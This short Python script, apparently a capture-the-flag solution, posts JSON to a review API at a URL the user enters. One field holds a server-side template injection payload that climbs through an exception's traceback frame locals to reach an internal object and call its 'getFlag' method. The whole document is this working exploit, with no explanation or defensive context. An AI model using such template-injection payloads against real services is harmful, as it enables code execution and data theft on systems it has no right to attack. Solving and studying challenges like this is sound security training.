import requests
import json

url = input("ENTER BASE URL: ") + "/api/v1/review"

payload = json.dumps({
  "stars": "{{pls gib error}}",
  "__v": "{{(e|attr('__traceback__')|attr('tb_frame')|attr('f_locals'))['RateProcOb']|attr('getFlag')()}}"
})

response = requests.request("POST", url, data=payload, headers={'Content-Type': 'application/json'})

print(response.text)
